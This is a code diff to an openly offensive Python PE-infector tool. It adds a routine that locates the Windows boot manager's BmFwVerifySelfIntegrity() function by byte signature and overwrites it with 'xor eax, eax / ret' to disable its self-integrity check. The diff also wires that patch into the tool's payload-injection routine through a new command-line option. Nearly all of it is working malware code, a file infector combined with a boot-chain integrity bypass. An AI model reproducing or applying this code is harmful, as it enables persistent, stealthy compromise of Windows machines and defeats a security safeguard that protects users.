@@ -12,7 +12,47 @@ INFECTOR_CONFIG_LEN = 8 + 8 + 8 + 8 + 8
 # IMAGE_DOS_HEADER.e_res magic constant to mark infected file
 INFECTOR_SIGN = 'INFECTED'
 
-def infect(src, payload, dst = None):
+def patch_win_boot_mgr_integrity(data):
+
+    for i in range(0, len(data) - 0x100):
+
+        '''
+            Check for bootmgr!BmFwVerifySelfIntegrity() signature:
+
+                mov     [rsp-30h+arg_0], ecx
+                push    rbp
+                push    rbx
+                push    rsi
+                push    rdi
+                push    r13
+                push    r14
+                mov     rbp, rsp
+                sub     rsp, 68h
+                mov     rax, cs:qword_1014DE10
+                xor     edi, edi
+                and     [rbp+Src], 0
+                and     [rbp+arg_10], 0
+                or      [rbp+arg_0], 0FFFFFFFFh
+                or      [rbp+arg_8], 0FFFFFFFFh
+        '''
+
+        if data[i + 0x00] == '\x89' and data[i + 0x01] == '\x4c' and \
+           data[i + 0x26] == '\x83' and data[i + 0x27] == '\x4d' and data[i + 0x28] == '\x38' and data[i + 0x29] == '\xff' and \
+           data[i + 0x2a] == '\x83' and data[i + 0x2b] == '\x4d' and data[i + 0x2c] == '\x40' and data[i + 0x2d] == '\xff':
+
+            # xor eax, eax / ret
+            patch = '\x33\xc0\xc3'
+
+            print('[+] bootmgr!BmFwVerifySelfIntegrity() signature found at offset 0x%.8x' % i)
+
+            # patch the function to disable self check
+            return data[: i] + patch + data[i + len(patch) :]
+
+    print('ERROR: Unable to find bootmgr!BmFwVerifySelfIntegrity() function')
+
+    return None
+
+def infect(src, payload, dst = None, patch_integrity = False):
 
     try:
 
@@ -78,6 +118,8 @@ def infect(src, payload, dst = None):
 
         raise Exception('Last section virtual size must be less or equal than raw size')
 
+    raw_size = last_section.PointerToRawData + last_section.SizeOfRawData 
+
     # save original entry point address of target image
     conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint
 
@@ -116,7 +158,16 @@ def infect(src, payload, dst = None):
     print('New image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)
 
     # get infected image data
-    data = pe_src.write() + data
+    data = pe_src.write()[: raw_size] + data
+
+    if patch_integrity:
+
+        # patch self-integrity checks of windows boot manager
+        data = patch_win_boot_mgr_integrity(str(data))
+        if data is None:
+
+            # error occurred
+            return None
 
     if dst is not None:
 
@@ -138,6 +189,9 @@ def main():
             help = 'infect payload path'),
 
         make_option('-o', '--output', dest = 'output', default = None,
+            help = 'file path to save infected file'),
+
+        make_option('--patch-integrity-checks', dest = 'patch_integrity', default = False, action = 'store_true',
             help = 'file path to save infected file')
     ]
 
@@ -167,9 +221,10 @@ def main():
         print('[+] Output file: %s' % options.output)
 
         # infect source file with specified payload
-        infect(options.infect, options.payload, dst = options.output) 
+        if infect(options.infect, options.payload, 
+                  dst = options.output, patch_integrity = options.patch_integrity) is not None:
 
-        print('[+] DONE')
+            print('[+] DONE')
 
         return 0
 
